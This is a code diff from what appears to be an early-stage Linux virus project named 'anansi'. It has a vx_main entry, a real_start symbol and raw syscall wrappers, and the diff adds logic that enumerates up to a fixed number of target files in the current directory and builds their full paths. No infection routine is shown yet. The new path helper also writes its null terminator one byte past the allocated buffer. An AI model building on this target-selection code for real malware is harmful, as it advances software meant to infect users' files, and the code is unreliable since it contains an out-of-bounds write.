@@ -5,14 +5,20 @@
 #include<sys/stat.h>
 #include<sys/mman.h>
 #include<linux/limits.h>
-#include <fcntl.h>
+#include<fcntl.h>
 
 #define STDOUT STDOUT_FILENO
 #define FAILURE -1
 #define SUCCESS 0
 
-extern unsigned long real_start;
 
+#ifndef MAX_TARGET
+	#define MAX_TARGET 3
+#endif
+
+extern unsigned long real_start;
+// functions unique to anansi
+char *create_full_path(char *directory, char *filename);
 
 // anansi syscall prototypes
 int anansi_exit(int status);
@@ -30,6 +36,7 @@ long anansi_close(int fd);
 
 size_t anansi_strlen(const char *s);
 void *anansi_malloc(size_t len);
+void anansi_strncpy(char *restrict dest, const char *src, size_t n);
 
 struct linux_dirent {
 	unsigned long  d_ino;     /* Inode number */
@@ -82,9 +89,10 @@ void vx_main()
 {
 	char *cwd = NULL;
 	char *cwd_listings = NULL;
+	char *full_path = NULL;
 
 	struct linux_dirent *d;
-	int cwd_fd, nread, status = SUCCESS;
+	int cwd_fd, nread, status = SUCCESS, max_target = MAX_TARGET;
 	const size_t DIR_LISTING_SIZE = 5000;
 
 	if(!(cwd = anansi_malloc(PATH_MAX))) {
@@ -110,8 +118,17 @@ void vx_main()
 		d = (struct linux_dirent *) (cwd_listings + entry);
 		if(d->d_name[0] == '.' )
 			continue;
-		anansi_write(STDOUT, d->d_name, anansi_strlen(d->d_name));
+
+		if(!max_target)
+			break;
+
+		if(!(full_path = create_full_path(cwd, d->d_name)))
+			continue;
+
+		anansi_write(STDOUT, full_path, anansi_strlen(full_path));
 		anansi_write(STDOUT, "\n", 1);
+		anansi_munmap(full_path, anansi_strlen(full_path) + 1);
+		max_target--;
 	}
 
 clean_up:
@@ -120,6 +137,28 @@ clean_up:
 	if(cwd_listings != NULL)
 		anansi_munmap(cwd_listings, DIR_LISTING_SIZE);
 	anansi_exit(status);
+}
+
+char *create_full_path(char *directory, char *filename)
+{
+	char *absolute_path;
+	size_t filename_len = anansi_strlen(filename);
+	size_t dir_len = anansi_strlen(directory);
+	size_t allocatation_size  = anansi_strlen(directory) + filename_len;
+
+	// 1 byte for null terminator and 1 byte for '/' appended to directory
+	allocatation_size += 2;
+	if(!(absolute_path = anansi_malloc(allocatation_size))) {
+		return NULL;
+	}
+
+	anansi_strncpy(absolute_path, directory, allocatation_size);
+
+	absolute_path[dir_len++] = '/';
+	anansi_strncpy(absolute_path + dir_len, filename, filename_len);
+	absolute_path[allocatation_size] = '\0';
+
+	return absolute_path;
 }
 
 size_t anansi_strlen(const char *s)
@@ -136,6 +175,13 @@ void *anansi_malloc(size_t len)
 	void *mem;
 	mem = anansi_mmap(NULL, len, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, -1, 0);
 	return mem;
+}
+
+void anansi_strncpy(char *restrict dest, const char *src, size_t n)
+{
+	while(n-- && *src != '\0')
+		*dest++ = *src++;
+	*dest  = '\0';
 }
 
 #define __load_syscall_ret(var) __asm__ __volatile__ ("mov %%rax, %0" : "=r" (var));
